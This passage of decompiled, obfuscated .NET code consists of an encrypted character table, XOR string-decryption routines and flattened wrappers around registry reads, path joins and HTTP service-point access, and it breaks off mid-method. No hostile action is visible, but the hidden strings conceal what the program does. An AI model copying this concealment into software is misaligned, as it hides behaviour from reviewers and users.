                '㲎',
                'ዉ',
                '㌄',
                'ቛ',
                'Հ',
                '٥',
                'ᓶ',
                'ሾ',
                '㲸',
                'ዕ',
                '\t',
                '\u0011',
                char.MinValue,
                '㲯',
                'ኰ',
                '㌔',
                'ቼ',
                'Ձ',
                'ر',
                'ᒴ',
                '\u125F',
                '㲆',
                'ኊ',
                '㌫',
                'ቾ',
                'ԍ',
                '\u0600',
                'ᒽ',
                'ቸ',
                '㲶',
                '\n',
                '\u0015',
                char.MinValue,
                'ኂ',
                '㌇',
                '\u124E',
                'Ն',
                'غ',
                'ᒼ',
                'ቕ',
                '㲱',
                '\u128E',
                '㌿',
                'ቸ',
                'ձ',
                'ر',
                'ᒨ',
                'ቯ',
                '㲰',
                'ኛ',
                '㌫',
                '\u125F',
                '\u0557',
                'غ',
                '\v',
                '\u001F',
                char.MinValue,
                '㌣',
                'ር',
                '՞',
                'ٴ',
                'ᒉ',
                'ት',
                '㲣',
                'ኃ',
                '㌱',
                'ቩ',
                '՚',
                'ٴ',
                'ᒑ',
                'ቭ',
                '㲲',
                'ኝ',
                '㌷',
                'ቫ',
                'Ն',
                'ع',
                'ᒽ',
                'ቮ',
                '㲶',
                'ዏ',
                '㌈',
                'ቯ',
                'Ռ',
                'س',
                'ᒪ',
                'ቡ',
                '㲯',
                '\f',
                '\u0002',
                char.MinValue,
                'ቔ',
                'յ',
                '\r',
                '\u000F',
                char.MinValue,
                '\u0560',
                'ئ',
                'ᒽ',
                'ቡ',
                '㲶',
                'ኊ',
                '㌝',
                'ታ',
                'Հ',
                'ئ',
                'ᒡ',
                'ተ',
                '㲶',
                'ኀ',
                '㌪',
                '\u000E',
                '&',
                char.MinValue,
                'د',
                'ᓯ',
                'ቂ',
                '㲁',
                '\u12D7',
                '㍪',
                'ራ',
                'Ԛ',
                'ؕ',
                'ᓵ',
                'ቄ',
                '㲄',
                'ኮ',
                '㍯',
                'ሰ',
                'ԗ',
                'ؗ',
                'ᓮ',
                'ሳ',
                '㳯',
                'ዖ',
                '㍪',
                '\u1259',
                'ե',
                'ٹ',
                'ᒛ',
                'ቅ',
                '㲁',
                'ክ',
                '㍨',
                'ቛ',
                'ա',
                'ؕ',
                'ᓭ',
                'ሹ',
                '㳱',
                'ካ',
                '㌥',
                '\u000F',
                '\a',
                char.MinValue,
                'ᒻ',
                'ት',
                '㲰',
                'ኝ',
                '㌽',
                'ታ',
                '\u0557',
                '\u0010',
                '%',
                char.MinValue,
                'ሡ',
                '㳳',
                'ኍ',
                '㍭',
                'ቹ',
                'Ԗ',
                '٣',
                'ᓨ',
                'ቦ',
                '㳯',
                'ዛ',
                '㌾',
                'ራ',
                'Շ',
                'ٹ',
                'ᓬ',
                'ሱ',
                '㳺',
                'ዘ',
                '㍵',
                'ረ',
                'Ԗ',
                'ص',
                'ᓫ',
                'ር',
                '㲠',
                '\u12D7',
                '㍫',
                'ሪ',
                'Ԕ',
                '٬',
                'ᒹ',
                'ሶ',
                '㳱',
                '\u1289',
                '㍡',
                'ሩ',
                '\u0011',
                '\u000F',
                char.MinValue,
                '㳾',
                'ዀ',
                '㌊',
                '\u124E',
                'բ',
                '؟',
                'ᒽ',
                'ቹ',
                '㲔',
                '\u128E',
                '㌴',
                'ቨ',
                'Ն',
                '٪',
                'ᓺ',
                '\u0012',
                '5',
                char.MinValue,
                'ዅ',
                '㍲',
                'ሷ',
                'ԃ',
                '\u061D',
                'ᒶ',
                'ቦ',
                '㲭',
                'ኝ',
                '㌵',
                'ቼ',
                '\u0557',
                'ؽ',
                'ᒷ',
                'ቮ',
                '㳢',
                'ኁ',
                '㌷',
                'ቩ',
                'ԃ',
                'ئ',
                'ᒽ',
                'ተ',
                '㲭',
                'ኝ',
                '㌬',
                'ቸ',
                'Շ',
                'ٴ',
                'ᒾ',
                'ቯ',
                '㲰',
                'ዏ',
                '㌫',
                'ቸ',
                'Հ',
                'ء',
                'ᒪ',
                'ቩ',
                '㲶',
                'ኖ',
                '㍸',
                'ቯ',
                'Ն',
                'ص',
                'ᒫ',
                'ቯ',
                '㲬',
                'ኜ',
                '㍸',
                'ሷ',
                'ԉ',
                'پ',
                '\u0013',
                '\u0004',
                char.MinValue,
                '㌊',
                'ቼ',
                'Ս',
                'ؿ',
                '\u0014',
                '\u0001',
                char.MinValue,
                'በ',
                '\u0015',
                '\t',
                char.MinValue,
                'շ',
                'ح',
                'ᒨ',
                'ብ',
                '㲆',
                'ኊ',
                '㌾',
                'ቔ',
                'է',
                '\u0016',
                '\u0018',
                char.MinValue,
                '\u0601',
                'ᒶ',
                'ቨ',
                '㲣',
                'ኁ',
                '㌼',
                'ቱ',
                'Ն',
                'ذ',
                'ᒝ',
                'ቸ',
                '㲡',
                'ኊ',
                '㌨',
                'ቩ',
                'Պ',
                'ػ',
                'ᒶ',
                'ቒ',
                '㲧',
                'ኟ',
                '㌷',
                'ቯ',
                '\u0557',
                '\u0017',
                '\n',
                char.MinValue,
                'ᒙ',
                'ታ',
                '㲱',
                'ኊ',
                '㌵',
                'ቿ',
                'Տ',
                'ح',
                'ᒑ',
                'ቄ',
                '\u0018',
                '\n',
                char.MinValue,
                'ቁ',
                '㲱',
                'ኜ',
                '㌽',
                'ተ',
                'Ձ',
                'ظ',
                'ᒱ',
                'ብ',
                '㲱',
                '\u0019',
                '\t',
                char.MinValue,
                '㲍',
                'ኼ',
                '㌎',
                'ቸ',
                'Ց',
                'ا',
                'ᒱ',
                'ቯ',
                '㲬',
                '\u001A',
                '\n',
                char.MinValue,
                'ኼ',
                '㌬',
                'ቼ',
                'Հ',
                'ؿ',
                'ᒌ',
                'ቲ',
                '㲣',
                'ኌ',
                '㌽',
                '\u001B',
                '\u0013',
                char.MinValue,
                '㌝',
                'ብ',
                'Հ',
                'ر',
                'ᒨ',
                'ቴ',
                '㲫',
                'ኀ',
                '㌶',
                '\u124E',
                '\u0557',
                'ص',
                'ᒻ',
                'ቫ',
                '㲆',
                'ኊ',
                '㌨',
                'ቩ',
                'Ջ',
                '\u001C',
                '\b',
                char.MinValue,
                'ቛ',
                'Ֆ',
                'ظ',
                'ᒴ',
                '\u124E',
                '㲣',
                'ኂ',
                '㌽',
                '\u001D',
                '\u001B',
                char.MinValue,
                'է',
                'ػ',
                'ᒖ',
                'ቯ',
                '㲶',
                'ኬ',
                '㌹',
                'ቭ',
                '\u0557',
                'ء',
                'ᒪ',
                'ብ',
                '㲄',
                'ኆ',
                '㌽',
                'ቱ',
                'Շ',
                'ا',
                'ᒙ',
                'ቴ',
                '㲶',
                'ኝ',
                '㌱',
                'ቿ',
                'Ֆ',
                'ؠ',
                'ᒽ',
                '\u001E',
                '\u0001',
                char.MinValue,
                'ذ',
                '\u001F',
                '\u0004',
                char.MinValue,
                'ᒕ',
                'ቯ',
                '㲰',
                'ኊ',
                ' ',
                '\u0004',
                char.MinValue,
                'ቤ',
                '㲣',
                'ኛ',
                '㌹',
                '!',
                '\b',
                char.MinValue,
                '㲹',
                'ኝ',
                '㌽',
                'ቭ',
                'Ռ',
                'ئ',
                'ᒬ',
                'ች',
                '"',
                '\u0005',
                char.MinValue,
                'ኩ',
                '㌹',
                'ቱ',
                'Ր',
                'ر',
                '#',
                '\v',
                char.MinValue,
                '㌍',
                'ቮ',
                'Ղ',
                'س',
                'ᒽ',
                'ቒ',
                '㲧',
                'ኟ',
                '㌷',
                'ቯ',
                '\u0557',
                '$',
                '\b',
                char.MinValue,
                'ቛ',
                'Ն',
                'ص',
                'ᒬ',
                'ት',
                '㲰',
                'ኊ',
                '㌫',
                '%',
                '!',
                char.MinValue,
                'Ջ',
                'ؠ',
                'ᒬ',
                'ተ',
                '㳸',
                'ዀ',
                '㍷',
                'ቮ',
                'Ղ',
                'أ',
                'ᒽ',
                'ቢ',
                '㲱',
                'ኊ',
                '㌪',
                'ቫ',
                'Պ',
                'ط',
                'ᒽ',
                'ሮ',
                '㲰',
                'ኊ',
                '㌼',
                'ሰ',
                'Մ',
                'ص',
                'ᒬ',
                'ብ',
                '㳬',
                'ኌ',
                '㌷',
                'ተ',
                'Ԍ',
                '&',
                '\u0014',
                char.MinValue,
                'ؙ',
                'ᒱ',
                'ባ',
                '㲰',
                'ኀ',
                '㌫',
                'ቲ',
                'Յ',
                'ؠ',
                'ᓸ',
                'ቓ',
                '㲣',
                'ኁ',
                '㌫',
                'ሽ',
                'հ',
                'ر',
                'ᒪ',
                'ቩ',
                '㲤',
                '\'',
                '#',
                char.MinValue,
                'ᒈ',
                'ቬ',
                '㲧',
                '\u128E',
                '㌫',
                'ቸ',
                'ԃ',
                'ؠ',
                'ᒽ',
                'ቬ',
                '㲮',
                'ዏ',
                '㌣',
                'ር',
                '՞',
                'ٴ',
                'ᒹ',
                'ቢ',
                '㲭',
                'ኚ',
                '㌬',
                'ሽ',
                '\u0557',
                'ؼ',
                'ᒱ',
                'ታ',
                '㳢',
                'ኟ',
                '㌪',
                'ቲ',
                'Ձ',
                'ظ',
                'ᒽ',
                'ቭ',
                '㳬',
                '(',
                '\u009A',
                char.MinValue,
                'ቔ',
                '㲭',
                'ዏ',
                '㌰',
                'ቸ',
                'Տ',
                'ؤ',
                'ᓸ',
                'ቩ',
                '㲯',
                'ኟ',
                '㌪',
                'ቲ',
                'Օ',
                'ر',
                'ᓸ',
                'ቴ',
                '㲪',
                'ኊ',
                '㍸',
                'ቮ',
                'Ռ',
                'ز',
                'ᒬ',
                'ቷ',
                '㲣',
                'ኝ',
                '㌽',
                'ሽ',
                '՚',
                'ػ',
                'ᒭ',
                'ሠ',
                '㲷',
                'ኜ',
                '㌽',
                'ሱ',
                'ԃ',
                'د',
                'ᓨ',
                'ች',
                '㳢',
                'ኆ',
                '㌫',
                'ሽ',
                'Պ',
                'غ',
                'ᒬ',
                'ብ',
                '㲰',
                'ኊ',
                '㌫',
                'ቩ',
                'Ն',
                'ذ',
                'ᓸ',
                'ቩ',
                '㲬',
                'ዏ',
                '㌴',
                'ቸ',
                'Ղ',
                'ئ',
                'ᒶ',
                'ቩ',
                '㲬',
                'ኈ',
                '㍸',
                'ተ',
                'Ռ',
                'ئ',
                'ᒽ',
                'ሠ',
                '㲣',
                'ኍ',
                '㌷',
                'ቨ',
                '\u0557',
                'ٴ',
                'ᒬ',
                'ቨ',
                '㲫',
                'ኜ',
                '㍸',
                'ቸ',
                'Ց',
                'ئ',
                'ᒷ',
                'ቲ',
                '㳬',
                'ዏ',
                '㌏',
                'ቸ',
                'ԃ',
                'ؼ',
                'ᒹ',
                'ቶ',
                '㲧',
                'ዏ',
                '㌻',
                'ቯ',
                'Ն',
                'ص',
                'ᒬ',
                'ብ',
                '㲦',
                'ዏ',
                '㌹',
                'ሽ',
                'Ց',
                'ر',
                'ᒨ',
                'ቯ',
                '㲰',
                'ኛ',
                '㍸',
                'ቼ',
                'Ձ',
                'ػ',
                'ᒭ',
                'ቴ',
                '㳢',
                'ኛ',
                '㌰',
                'ቸ',
                'ԃ',
                'ر',
                'ᒪ',
                'ቲ',
                '㲭',
                'ኝ',
                '㍸',
                'ቻ',
                'Ռ',
                'ئ',
                'ᓸ',
                'ቹ',
                '㲭',
                'ኚ',
                '㍸',
                'ቩ',
                'Ռ',
                'ٴ',
                'ᒫ',
                'ብ',
                '㲬',
                'ኋ',
                '㍸',
                'ቩ',
                'Ռ',
                'ٴ',
                'ᒭ',
                'ታ',
                '㳬',
                ')',
                '\u000F',
                char.MinValue,
                '㲇',
                'ኝ',
                '㌪',
                'ቲ',
                'Ց',
                'ٴ',
                'ᒊ',
                'ብ',
                '㲲',
                'ኀ',
                '㌪',
                'ቩ',
                'Պ',
                'غ',
                'ᒿ',
                '*',
                'H',
                char.MinValue,
                '\u12BF',
                '㌴',
                'ቸ',
                'Ղ',
                'ا',
                'ᒽ',
                'ሠ',
                '㲵',
                '\u128E',
                '㌱',
                'ቩ',
                'ԃ',
                'أ',
                'ᒰ',
                'ቩ',
                '㲮',
                'ኊ',
                '㍸',
                'ቦ',
                'ԓ',
                'ة',
                'ᓸ',
                'ቩ',
                '㲱',
                'ዏ',
                '㌫',
                'ቸ',
                'Ս',
                'ذ',
                'ᒱ',
                'ቮ',
                '㲥',
                'ዏ',
                '㌬',
                'ት',
                'Ն',
                'ٴ',
                'ᒪ',
                'ብ',
                '㲲',
                'ኀ',
                '㌪',
                'ቩ',
                'ԃ',
                'ؠ',
                'ᒷ',
                'ሠ',
                '㲹',
                'ዞ',
                '㌥',
                'ሽ',
                '\u0557',
                'ؼ',
                'ᒪ',
                'ቯ',
                '㲷',
                'ኈ',
                '㌰',
                'ሽ',
                '\u0557',
                'ؼ',
                'ᒽ',
                'ሠ',
                '㲋',
                'ኁ',
                '㌬',
                'ቸ',
                'Ց',
                'غ',
                'ᒽ',
                'ቴ',
                '㳬',
                '+',
                '\u0012',
                char.MinValue,
                '㌝',
                'ታ',
                'Ղ',
                'ض',
                'ᒴ',
                'ብ',
                '㲔',
                'ኆ',
                '㌫',
                'ቨ',
                'Ղ',
                'ظ',
                'ᒋ',
                'ቴ',
                '㲻',
                'ኃ',
                '㌽',
                'ቮ',
                ',',
                'Ƽ',
                char.MinValue,
                'ቦ',
                'ԓ',
                'ة',
                'ᓸ',
                'ባ',
                '㲣',
                'ኁ',
                '㌶',
                'ቲ',
                '\u0557',
                'ٴ',
                'ᒱ',
                'ቮ',
                '㲫',
                'ኛ',
                '㌱',
                'ቼ',
                'Տ',
                'ؽ',
                'ᒢ',
                'ብ',
                '㳢',
                'ኆ',
                '㌬',
                'ቮ',
                'Ն',
                'ظ',
                'ᒾ',
                'ሠ',
                '㲠',
                'ኊ',
                '㌻',
                'ቼ',
                'Ֆ',
                'ا',
                'ᒽ',
                'ሠ',
                '㲱',
                'ኀ',
                '㌵',
                'ቸ',
                'ԃ',
                'ؤ',
                'ᒽ',
                'ቲ',
                '㲯',
                'ኆ',
                '㌫',
                'ቮ',
                'Պ',
                'ػ',
                'ᒶ',
                'ታ',
                '㳢',
                '\u128E',
                '㌪',
                'ቸ',
                'ԃ',
                'غ',
                'ᒷ',
                'ቴ',
                '㳢',
                'ኈ',
                '㌪',
                'ቼ',
                'Ս',
                'ؠ',
                'ᒽ',
                'ቤ',
                '㳬',
                'ዥ',
                '㍒',
                'ቄ',
                'Ռ',
                'ء',
                'ᓸ',
                'ተ',
                '㲰',
                'ኀ',
                '㌺',
                'ቼ',
                'Ձ',
                'ظ',
                'ᒡ',
                'ሠ',
                '㲶',
                'ኝ',
                '㌡',
                'ሽ',
                '\u0557',
                'ػ',
                'ᓸ',
                'ቬ',
                '㲣',
                'ኚ',
                '㌶',
                'ቾ',
                'Ջ',
                'ٴ',
                'ᒣ',
                'ሰ',
                '㲿',
                'ዏ',
                '㌱',
                'ታ',
                'ԃ',
                'ص',
                'ᓸ',
                'ተ',
                '㲣',
                'ኝ',
                '㌬',
                'ቴ',
                'Ղ',
                'ظ',
                'ᓵ',
                'ቴ',
                '㲰',
                'ኚ',
                '㌫',
                'ቩ',
                'ԃ',
                'ا',
                'ᒱ',
                'ቴ',
                '㲷',
                '\u128E',
                '㌬',
                'ቴ',
                'Ռ',
                'غ',
                'ᓶ',
                'ሠ',
                '㲋',
                'ኛ',
                '㍿',
                'ቮ',
                'ԃ',
                'ء',
                'ᒫ',
                'ት',
                '㲣',
                'ኃ',
                '㌴',
                'ቤ',
                'ԃ',
                'ؠ',
                'ᒰ',
                'ብ',
                '㳢',
                'ኌ',
                '㌹',
                'ቮ',
                'Ն',
                'ٴ',
                'ᒯ',
                'ቨ',
                '㲧',
                'ኁ',
                '㍸',
                'ቩ',
                'Ջ',
                'ر',
                'ᓸ',
                'ቡ',
                '㲲',
                'ኟ',
                '㌴',
                'ቴ',
                'Հ',
                'ص',
                'ᒬ',
                'ቩ',
                '㲭',
                'ኁ',
                '㍸',
                'ቴ',
                'Ր',
                'ٴ',
                'ᒰ',
                'ቯ',
                '㲱',
                'ኛ',
                '㌽',
                'ቹ',
                'ԃ',
                'ػ',
                'ᒶ',
                'ሠ',
                '㲣',
                'ዏ',
                '㌶',
                'ቸ',
                '\u0557',
                'أ',
                'ᒷ',
                'ቲ',
                '㲩',
                'ዏ',
                '㌫',
                'ት',
                'Ղ',
                'ئ',
                'ᒽ',
                'ሮ',
                '㳈',
                'ዥ',
                '㌁',
                'ቲ',
                'Ֆ',
                'ٴ',
                'ᒶ',
                'ብ',
                '㲧',
                'ኋ',
                '㍸',
                'ቩ',
                'Ռ',
                'ٴ',
                'ᒪ',
                'ት',
                '㲬',
                'ዏ',
                '㌣',
                'ር',
                '՞',
                'ٴ',
                'ᒱ',
                'ቮ',
                '㳢',
                '\u1289',
                '㌭',
                'ቱ',
                'Տ',
                'ٹ',
                'ᒬ',
                'ቲ',
                '㲷',
                'ኜ',
                '㌬',
                'ሱ',
                'ԃ',
                'ػ',
                'ᒪ',
                'ሠ',
                '㲣',
                'ኛ',
                '㍸',
                'ቱ',
                'Ն',
                'ص',
                'ᒫ',
                'ቴ',
                '㳢',
                'ኈ',
                '㌪',
                'ቼ',
                'Ս',
                'ؠ',
                'ᓸ',
                'ቩ',
                '㲶',
                'ዏ',
                '㌬',
                'ት',
                'Ն',
                'ٴ',
                'ᒍ',
                'ቮ',
                '㲯',
                '\u128E',
                '㌶',
                'ቼ',
                'Մ',
                'ر',
                'ᒼ',
                'ቃ',
                '㲭',
                'ኋ',
                '㌽',
                'ሽ',
                'Ր',
                'ر',
                'ᒻ',
                'ት',
                '㲰',
                'ኆ',
                '㌬',
                'ቤ',
                'ԃ',
                'ؤ',
                'ᒽ',
                'ቲ',
                '㲯',
                'ኆ',
                '㌫',
                'ቮ',
                'Պ',
                'ػ',
                'ᒶ',
                'ሮ',
                '㳈',
                'ዥ',
                '㌌',
                'ቲ',
                'ԃ',
                'س',
                'ᒪ',
                'ቡ',
                '㲬',
                'ኛ',
                '㍸',
                'ቩ',
                'Ջ',
                'ؽ',
                'ᒫ',
                'ሠ',
                '㲣',
                'ኟ',
                '㌨',
                'ቱ',
                'Պ',
                'ط',
                'ᒹ',
                'ቴ',
                '㲫',
                'ኀ',
                '㌶',
                'ሽ',
                '\u0557',
                'ؼ',
                'ᒽ',
                'ሠ',
                '㲰',
                'ኊ',
                '㌩',
                'ቨ',
                'Պ',
                'ئ',
                'ᒽ',
                'ቤ',
                '㳢',
                'ኟ',
                '㌽',
                'ቯ',
                'Վ',
                'ؽ',
                'ᒫ',
                'ታ',
                '㲫',
                'ኀ',
                '㌶',
                'ሱ',
                'ԃ',
                'ط',
                'ᒷ',
                'ቮ',
                '㲶',
                '\u128E',
                '㌻',
                'ቩ',
                'ԃ',
                'ح',
                'ᒷ',
                'ት',
                '㲰',
                'ዏ',
                '㌫',
                'ቤ',
                'Ր',
                'ؠ',
                'ᒽ',
                'ቭ',
                '㳢',
                '\u128E',
                '㌼',
                'ተ',
                'Պ',
                'غ',
                'ᒱ',
                'ታ',
                '㲶',
                'ኝ',
                '㌹',
                'ቩ',
                'Ռ',
                'ئ',
                'ᓴ',
                'ሠ',
                '㲭',
                'ኝ',
                '㍸',
                'ቨ',
                'Ր',
                'ر',
                'ᓸ',
                'ቴ',
                '㲪',
                'ኊ',
                '㍸',
                'ቐ',
                'Պ',
                'ط',
                'ᒪ',
                'ቯ',
                '㲱',
                'ኀ',
                '㌾',
                'ቩ',
                'ԃ',
                'ٺ',
                'ᒖ',
                'ቅ',
                '㲖',
                'ዏ',
                '㌞',
                'ቯ',
                'Ղ',
                'ع',
                'ᒽ',
                'ቷ',
                '㲭',
                'ኝ',
                '㌳',
                'ሽ',
                '\u0560',
                'ػ',
                'ᒶ',
                'ቦ',
                '㲫',
                'ኈ',
                '㌭',
                'ቯ',
                'Ղ',
                'ؠ',
                'ᒱ',
                'ቯ',
                '㲬',
                'ዏ',
                '㌬',
                'ቲ',
                'Ռ',
                'ظ',
                'ᓶ',
                '-',
                '\f',
                char.MinValue,
                'Ո',
                'ر',
                'ᒪ',
                'ቮ',
                '㲧',
                'ኃ',
                '㍫',
                'ሯ',
                'ԍ',
                'ذ',
                'ᒴ',
                'ቬ',
                '.',
                '\n',
                char.MinValue,
                '\u0601',
                'ᒫ',
                'ቡ',
                '㲥',
                'ኊ',
                '㌫',
                'ሳ',
                'Ձ',
                'ؽ',
                'ᒶ'
              };
              chArray1 = new char[8];
              num = 4;
              continue;
          }
        }
label_12:
        ႷႭ.ႥႥ = chArray2;
      }
      catch (Exception ex)
      {
        char[] o1 = chArray2;
        char[] o2 = chArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    internal static string ႥႳ([In] int obj0, [In] int obj1)
    {
      int num;
      int index1;
      char[] ⴅⴐ;
      int index2;
      string str;
      int length1;
      char[] chArray;
      char[] ⴅⴅ;
      int length2;
      int index3;
      try
      {
label_3:
        index1 = obj0 ^ 1491049167 ^ obj1;
        ⴅⴐ = ႷႭ.ႥႰ;
        index2 = (int) ⴅⴐ[index1];
        num = 7;
        while (true)
        {
          switch (num)
          {
            case 1:
              goto label_5;
            case 2:
              num = index3 < length1 ? 8 : 6;
              continue;
            case 3:
              num = 9;
              continue;
            case 4:
              index3 = 0;
              num = 2;
              continue;
            case 5:
            case 12:
              chArray = new char[length1];
              ⴅⴅ = ႷႭ.ႥႥ;
              length2 = ⴅⴅ.Length;
              index1 += 3;
              num = 4;
              continue;
            case 6:
              goto label_13;
            case 7:
              num = (str = ႷႭ.ႥႣ[index2]) == null ? 11 : 1;
              continue;
            case 8:
              chArray[index3] = (char) ((uint) ⴅⴐ[index1 + index3] ^ (uint) ⴅⴅ[(index3 + index2) % length2]);
              goto case 3;
            case 9:
              index3 = 1 + index3;
              num = 2;
              continue;
            case 10:
              goto label_3;
            case 11:
            case 13:
              length1 = (int) ⴅⴐ[index1 + 1];
              length1 = ((int) ⴅⴐ[index1 + 2] << 16) + length1;
              num = 12;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.ႥႳ);
              num = 10;
              continue;
          }
        }
label_5:
        return str;
label_13:
        str = new string(chArray);
        ႷႭ.ႥႣ[index2] = str;
        return str;
      }
      catch (Exception ex)
      {
        object[] objects = new object[12]
        {
          (object) index1,
          (object) index2,
          (object) length1,
          (object) ⴅⴐ,
          (object) str,
          (object) chArray,
          (object) ⴅⴅ,
          (object) length2,
          (object) index3,
          (object) num,
          (object) obj0,
          (object) obj1
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    internal static string ႥႭ([In] int obj0, [In] int obj1)
    {
      int num;
      int index1;
      char[] ⴅⴗ;
      int index2;
      string str;
      int length1;
      char[] chArray;
      char[] ⴅⴀ;
      int length2;
      int index3;
      try
      {
label_3:
        index1 = obj0 ^ 490613605 ^ obj1;
        ⴅⴗ = ႷႭ.ႥႷ;
        index2 = (int) ⴅⴗ[index1];
        num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
              goto label_5;
            case 1:
            case 5:
            case 12:
              length1 = (int) ⴅⴗ[index1 + 1];
              length1 = ((int) ⴅⴗ[index1 + 2] << 16) + length1;
              num = 10;
              continue;
            case 2:
              index3 = 1 + index3;
              num = 4;
              continue;
            case 3:
              num = (str = ႷႭ.ႥႼ[index2]) == null ? 5 : 0;
              continue;
            case 4:
              num = index3 < length1 ? 11 : 13;
              continue;
            case 6:
            case 7:
              goto label_3;
            case 8:
              index3 = 0;
              num = 4;
              continue;
            case 10:
              chArray = new char[length1];
              ⴅⴀ = ႷႭ.ႥႠ;
              length2 = ⴅⴀ.Length;
              index1 += 3;
              num = 8;
              continue;
            case 11:
              chArray[index3] = (char) ((uint) ⴅⴗ[index1 + index3] ^ (uint) ⴅⴀ[(index3 + index2) % length2]);
              num = 2;
              continue;
            case 13:
              goto label_12;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.ႥႭ);
              num = 6;
              continue;
          }
        }
label_5:
        return str;
label_12:
        str = new string(chArray);
        ႷႭ.ႥႼ[index2] = str;
        return str;
      }
      catch (Exception ex)
      {
        object[] objects = new object[12]
        {
          (object) index1,
          (object) index2,
          (object) length1,
          (object) ⴅⴗ,
          (object) str,
          (object) chArray,
          (object) ⴅⴀ,
          (object) length2,
          (object) index3,
          (object) num,
          (object) obj0,
          (object) obj1
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    internal static object ႰႣ([In] RegistryKey obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 118:
            num2 = 3;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 2;
              continue;
            case 2:
            case 5:
            case 7:
              goto label_3;
            case 3:
            case 6:
              goto label_8;
            case 4:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.ႰႣ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.GetValue(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        RegistryKey o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static string ႰႨ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 50:
            num2 = 1;
            break;
          case 51:
            num2 = 4;
            break;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 7:
              num1 = 3;
              continue;
            case 1:
              goto label_9;
            case 2:
            case 6:
              num1 = 3;
              continue;
            case 3:
            case 8:
              goto label_3;
            case 4:
              goto label_10;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.ႰႨ);
              num1 = 3;
              continue;
          }
        }
label_9:
        return obj0 + obj1;
label_10:
        return Path.Combine(obj0, obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static ParameterInfo[] ႰႠ([In] MethodBase obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 38:
            num2 = 4;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 7;
              continue;
            case 2:
            case 3:
              num1 = 7;
              continue;
            case 4:
            case 6:
              goto label_8;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.ႰႠ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.GetParameters();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        MethodBase o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static ServicePoint ႰႷ([In] HttpWebRequest obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 119:
            num2 = 3;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 3:
              goto label_8;
            case 2:
              goto label_3;
            case 4:
            case 6:
              num1 = 2;
              continue;
            case 7:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.ႰႷ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.ServicePoint;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        HttpWebRequest o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static bool ႰႼ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 75:
            num2 = 6;
            break;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              num1 = 3;
              continue;
            case 3:
            case 4:
              goto label_3;
            case 6:
              goto label_8;
            case 7:
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႭ.ႰႼ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return obj0.IsArray;
      }
      catch (Exception ex)
      {
